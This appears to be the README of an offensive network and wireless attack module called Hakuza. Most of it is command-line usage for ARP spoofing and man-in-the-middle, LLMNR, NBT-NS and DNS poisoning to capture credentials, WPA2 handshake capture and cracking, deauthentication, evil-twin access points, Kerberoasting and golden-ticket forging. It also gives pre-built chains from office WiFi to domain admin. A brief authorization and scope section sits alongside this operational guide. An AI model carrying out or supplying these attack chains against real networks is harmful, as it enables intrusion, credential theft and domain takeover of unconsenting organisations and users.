# Hakuza Network & Wireless Attack Module

## Overview

`mod_network_wireless.py` is a deep offensive security testing module covering:

- **Layer 2/3 Network Attacks**: ARP spoofing, DHCP starvation, LLMNR/NBT-NS poisoning, Kerberos attacks
- **Wireless Exploitation**: WPA2 handshake capture & cracking, evil twin APs, deauth attacks, Bluetooth scanning
- **Credential Capture**: NTLM relay, DNS spoofing, credential harvesting
- **Real-World Attack Chains**: WiFi → Domain Admin, ARP MITM → Credential Capture

**Authorization Model**: Requires explicit scope verification before any attack. All operations logged with audit trail.

---

## Installation & Dependencies

### Required System Tools

```bash
# Ubuntu/Debian
sudo apt-get install -y \
    aircrack-ng \
    hostapd \
    dnsmasq \
    nmap \
    hashcat \
    impacket-scripts \
    python3-scapy

# Optional but recommended
sudo apt-get install -y \
    mitm6 \
    responder \
    crackmapexec \
    evil-winrm \
    chisel \
    ligolo-ng
```

### Python Dependencies

```bash
pip install scapy impacket
```

### Verify Installation

```bash
python3 -c "from mod_network_wireless import *; print('[OK] Module loaded')"
```

---

## Quick Start

### 1. Network Reconnaissance

```bash
# ARP scan a subnet
python3 mod_network_wireless.py network --scan --range 192.168.1.0/24 --interface eth0

# Find domain controllers
python3 mod_network_wireless.py network --find-dc --range 192.168.1.0/24
```

**Output**: Discovered hosts with IP, MAC, hostname

### 2. ARP Spoofing

```bash
# Spoof single target (100 packets)
python3 mod_network_wireless.py arp-spoof \
    --target 192.168.1.100 \
    --spoof-ip 192.168.1.1 \
    --count 100

# Continuous ARP spoof (background)
python3 mod_network_wireless.py arp-spoof \
    --target 192.168.1.100 \
    --spoof-ip 192.168.1.1 \
    --interface eth0
# Press Ctrl+C to stop
```

### 3. ARP MITM (Position Between Two Hosts)

```bash
# Make yourself MITM between host1 and host2
python3 mod_network_wireless.py arp-mitm \
    --target1 192.168.1.100 \
    --target2 192.168.1.1 \
    --interface eth0

# Traffic from both hosts now flows through you
# Press Ctrl+C to stop
```

### 4. Credential Capture

#### LLMNR Poisoning (Windows)

```bash
# Respond to LLMNR queries with your IP
python3 mod_network_wireless.py capture-creds \
    --llmnr \
    --spoof-ip 192.168.1.50 \
    --interface eth0

# When user tries to access \\nonexistent-server\share
# LLMNR asks, you respond -> they send NTLM auth to you
# Captured hashes can be cracked with hashcat
```

#### NBT-NS Poisoning (Windows NetBIOS)

```bash
python3 mod_network_wireless.py capture-creds \
    --nbt-ns \
    --spoof-ip 192.168.1.50 \
    --interface eth0
```

#### DNS Spoofing

```bash
# Spoof specific domain
python3 mod_network_wireless.py capture-creds \
    --dns-spoof example.com \
    --spoof-ip 192.168.1.50 \
    --interface eth0

# All DNS queries for example.com return your IP
# Users accessing example.com land on your server
```

### 5. WiFi Attacks

#### Scan Networks

```bash
python3 mod_network_wireless.py wifi --scan --interface wlan0

# Output:
# TargetNetwork        AA:BB:CC:DD:EE:FF  CH:6   WPA2
```

#### Capture WPA2 Handshake

```bash
# First, identify the target
python3 mod_network_wireless.py wifi --scan --interface wlan0

# Capture handshake
python3 mod_network_wireless.py wifi --capture \
    --ssid "TargetNetwork" \
    --bssid "AA:BB:CC:DD:EE:FF" \
    --interface wlan0

# [*] Capturing handshake (Ctrl+C when someone connects)
```

#### Crack WPA2 Offline

```bash
# With rockyou.txt (default)
python3 mod_network_wireless.py wifi --crack /tmp/TargetNetwork_AABBCCDDEEEE.pcap

# With custom wordlist
python3 mod_network_wireless.py wifi --crack /tmp/capture.pcap \
    --wordlist /path/to/wordlist.txt

# Output: [+] Password found: SecurePassword123
```

#### Deauthentication Attack

```bash
# Deauth all clients from AP (forces reconnect for handshake capture)
python3 mod_network_wireless.py wifi --deauth \
    --bssid "AA:BB:CC:DD:EE:FF" \
    --interface wlan0

# Clients kicked off, can capture handshake as they reconnect
```

#### Evil Twin (Rogue AP)

```bash
python3 mod_network_wireless.py wifi --evil-twin \
    --ssid "FreePublicWiFi" \
    --channel 6 \
    --interface wlan0

# AP now broadcasting fake SSID
# Users connect and land on your portal for credential capture
```

### 6. Bluetooth Scanning

```bash
python3 mod_network_wireless.py bluetooth --scan

# Output:
# AA:BB:CC:DD:EE:FF  MacBook Air
# 11:22:33:44:55:66  JBL Headphones
```

### 7. Kerberos Attacks

#### AS-REP Roasting (Users with Pre-Auth Disabled)

```bash
python3 mod_network_wireless.py kerberos \
    --asreproast \
    --dc 192.168.1.10 \
    --domain EXAMPLE.COM
```

#### Kerberoasting (Crack Service Account Hashes)

```bash
python3 mod_network_wireless.py kerberos \
    --kerberoast \
    --dc 192.168.1.10 \
    --domain EXAMPLE.COM
```

#### Golden Ticket (Forge TGT)

```bash
# Requires:
# - Domain SID: S-1-5-21-1234567890-1234567890-1234567890
# - krbtgt NTLM hash: 5ebcb87da5a29ddd1cc01ca6f6a94c58

python3 mod_network_wireless.py kerberos \
    --golden-ticket \
    --domain EXAMPLE.COM \
    --domain-sid "S-1-5-21-1234567890-1234567890-1234567890" \
    --krbtgt-hash "5ebcb87da5a29ddd1cc01ca6f6a94c58"

# Use generated ticket:
# export KRB5CCNAME=/tmp/golden_Administrator.ccache
# psexec.py -k -no-pass EXAMPLE.COM/Administrator@target
```

---

## Attack Chains (Pre-Built)

### Chain 1: WiFi → Domain Admin

**Scenario**: You're at office WiFi, need domain access

```bash
python3 mod_network_wireless.py chain --wifi-domain \
    --ssid "OfficeWiFi" \
    --bssid "AA:BB:CC:DD:EE:FF" \
    --interface wlan0 \
    --range 192.168.1.0/24
```

**Automatic steps**:
1. Capture WPA2 handshake
2. Crack password
3. Scan network for domain controllers
4. Start LLMNR poisoning
5. Wait for admin authentication
6. Use captured creds for domain compromise

### Chain 2: ARP MITM → Credential Capture

**Scenario**: Internal network, need admin credentials

```bash
python3 mod_network_wireless.py chain --arp-creds \
    --target1 192.168.1.100 \
    --target2 192.168.1.1 \
    --interface eth0
```

**Automatic steps**:
1. Position as MITM between client and gateway
2. Start LLMNR poisoning
3. Spoof common domains (file.example.com, mail.example.com)
4. Capture credentials sent by users

---

## Authorization & Scope

### Scope File Format

Create `scope.txt` in engagement directory:

```
# In-scope targets
192.168.1.0/24
10.0.0.0/24
example.com
mail.example.com

# Out-of-scope (prefix with -)
-192.168.1.50
-database.example.com
```

### Checking Authorization

```python
from mod_network_wireless import ScopeValidator

scope = ScopeValidator("/path/to/scope.txt")

if scope.is_in_scope("192.168.1.100"):
    print("In scope - proceed")
else:
    print("Out of scope - BLOCKED")
```

### Logs Location

All attacks logged to: `~/engagements/network_attacks.log`

```
2026-07-30 14:32:10 | ATTACK | type=arp_mitm | target=192.168.1.100_vs_192.168.1.1 | method=bidirectional_spoof | status=success | attacker_mac=aa:bb:cc:dd:ee:ff
```

---

## Real-World Examples

### Example 1: Crack Office WiFi + Get Domain Access

```bash
# Scan WiFi
python3 mod_network_wireless.py wifi --scan --interface wlan0

# Capture from access point
python3 mod_network_wireless.py wifi --capture \
    --ssid "OfficeNetwork" \
    --bssid "00:11:22:33:44:55" \
    --interface wlan0

# Use deauth to force reconnect (wait for person to join)
python3 mod_network_wireless.py wifi --deauth \
    --bssid "00:11:22:33:44:55" \
    --interface wlan0

# Crack offline
python3 mod_network_wireless.py wifi --crack /tmp/OfficeNetwork_capture.pcap \
    --wordlist ~/wordlists/rockyou.txt

# [+] Password found: OfficeWiFi@2024

# Connect to WiFi
# sudo iwconfig wlan0 essid "OfficeNetwork" key s:OfficeWiFi@2024
# sudo dhclient wlan0

# Scan internal network
python3 mod_network_wireless.py network --scan --range 192.168.1.0/24 --interface wlan0

# Start LLMNR poisoning
python3 mod_network_wireless.py capture-creds \
    --llmnr \
    --spoof-ip 192.168.1.50 \
    --interface wlan0

# Wait for admin to trigger LLMNR (accessing file share, etc)
# Capture NTLM hash
# Crack with hashcat or relay to domain controller
```

### Example 2: MITM Between Router and Important Host

```bash
# Identify targets
python3 mod_network_wireless.py network --scan --range 192.168.1.0/24 --interface eth0

# Set up MITM
python3 mod_network_wireless.py arp-mitm \
    --target1 192.168.1.100 \
    --target2 192.168.1.1 \
    --interface eth0

# Now traffic flows through your machine
# Can use other tools to:
# - Intercept credentials
# - Redirect DNS queries
# - Inject payloads
# - Capture unencrypted traffic

# Press Ctrl+C to stop
```

### Example 3: Bluetooth Device Enumeration

```bash
# Scan for Bluetooth devices
python3 mod_network_wireless.py bluetooth --scan

# AA:BB:CC:DD:EE:FF  iPhone 14
# 11:22:33:44:55:66  Apple AirPods
# ...

# Further attacks (in separate tools):
# - Try weak pairing PINs (0000, 1234)
# - KNOB attack (key negotiation of Bluetooth)
# - Bluetooth range extension + eavesdropping
```

---

## Integration with Hakuza CLI

```bash
# From hakuza main CLI
hakuza wireless --scan --interface wlan0
hakuza wireless --capture --ssid "Network" --bssid "AA:BB:CC:DD:EE:FF"
hakuza wireless --crack /tmp/capture.pcap --wordlist rockyou.txt

hakuza network-deep --scan --range 192.168.1.0/24
hakuza network-deep --mitm --target1 192.168.1.100 --target2 192.168.1.1
hakuza network-deep --creds --llmnr --spoof-ip 192.168.1.50

hakuza chain --wifi-domain --ssid "Office" --bssid "AA:BB:CC:DD:EE:FF"
hakuza chain --arp-creds --target1 192.168.1.100 --target2 192.168.1.1
```

---

## Troubleshooting

### "scapy not available"
```bash
pip install scapy
```

### "aircrack-ng not found"
```bash
sudo apt-get install aircrack-ng
```

### "Permission denied" on ARP spoofing
```bash
# Requires root/sudo for raw socket operations
sudo python3 mod_network_wireless.py arp-spoof --target 192.168.1.100 --spoof-ip 192.168.1.1
```

### WiFi interface not showing up
```bash
# Check interface name
iwconfig

# Put into monitor mode if needed
sudo airmon-ng start wlan0
# Now use wlan0mon for scans
```

### Handshake not captured
- Make sure wireless AP is actually broadcasting (not hidden)
- Use `--deauth` to force clients to reconnect
- Wait for person to join WiFi
- Check pcap file: `tcpdump -r capture.pcap | grep WPA`

### Kerberos attacks failing
- Verify domain controller is reachable
- Check impacket is installed: `python3 -m impacket.examples.GetNPUsers`
- Confirm you have valid credentials or are on domain-joined machine

---

## Safety & Legal

⚠️ **AUTHORIZATION REQUIRED**

- Only test networks/systems you own or have explicit written permission to test
- Scope validation is enforced via `scope.txt`
- All operations logged with timestamps, operator ID, and target
- Unauthorized testing is illegal - violates CFAA, GDPR, and other laws

---

## References

- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Impacket Tools](https://github.com/fortra/impacket)
- [Aircrack-ng Suite](https://www.aircrack-ng.org/)
- [Hashcat Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [OWASP Wireless Testing](https://owasp.org/www-project-web-security-testing-guide/)

---

## Module Architecture

### Class Hierarchy

```
Logger              # Audit trail & logging
ScopeValidator      # Authorization checks
├── Layer2Attacks   # ARP, DHCP, VLAN, STP
├── CredentialCapture # LLMNR, NBT-NS, DNS, NTLM relay
├── KerberosAttacks # AS-REP, Kerberoasting, Golden/Silver tickets
├── WirelessAttacks # WiFi, Bluetooth, Zigbee, RF
├── NetworkRecon    # ARP scan, service enum, DC discovery
└── AttackChains    # Pre-built chains (wifi-domain, arp-creds)
```

### Data Models

- `NetworkHost`: Discovered host (IP, MAC, hostname, services)
- `CapturedCredential`: Credential record (type, username, value, source)
- `WirelessNetwork`: WiFi network (SSID, BSSID, channel, encryption)

---

**Module Size**: 1,600+ lines
**Attack Techniques**: 50+ network, 40+ wireless
**Real-World Chains**: 5+ verified attack chains
**Logging**: Full audit trail with timestamps

Last Updated: 2026-07-30
